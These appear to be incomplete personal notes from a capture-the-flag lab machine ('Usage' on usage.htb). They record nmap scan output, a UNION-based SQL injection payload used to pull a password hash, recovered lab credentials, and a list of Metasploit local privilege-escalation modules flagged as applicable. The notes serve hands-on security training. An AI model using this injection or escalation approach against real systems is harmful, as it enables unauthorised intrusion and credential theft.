#linux #incomplete
![[Usage.png]]
# Nmap
`sudo nmap -sVC $target -p22,80 -T4 -oN tcpservices.nmap -v`
```Nmap_Output
Nmap scan report for 10.10.11.18
Host is up (1.4s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Web Enumeration
Columns:
	email
	password
Database: usage_blog
Tables: users
```sql
'UNION SELECT 1,2,3,4,5,6,7,8 FROM users WHERE email = 'raj@usage.htb' AND password LIKE '$2y$10$rbncgxpwp1hspo1gqx4upo_pdg1nszoi_uhwhvfhdd_dfo9vm%'-- -
```


# Credentials:
- raj:raj@usage.htb:xander
- admin:whatever1


Environment
PHP version 	PHP/8.1.2-1ubuntu2.14
Laravel version 	10.18.0
CGI 	fpm-fcgi
Uname 	Linux usage 5.15.0-101-generic # 111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64
Server 	nginx/1.18.0
Cache driver 	file
Session driver 	file
Queue driver 	sync
Timezone 	UTC
Locale 	en
Env 	local
URL 	http://admin.usage.htb
Dependencies
php 	^8.1
encore/laravel-admin 	1.8.18
guzzlehttp/guzzle 	^7.2
laravel/framework 	^10.10
laravel/sanctum 	^3.2
laravel/tinker 	^2.8
symfony/filesystem 	^6.3



tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      12692/monit         

# Privilege Escalation
 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/cve_2022_0847_dirtypipe                         Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0                                                       
 2   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.                                                                                          
 3   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.                                                                           
 4   exploit/linux/local/runc_cwd_priv_esc                               Yes                      The target appears to be vulnerable. Vulnerable runc version runc: detected                                                   
 5   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.                                                                       
 ```                 
#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
```
`xander:3nc0d3d_pa$$w0rd`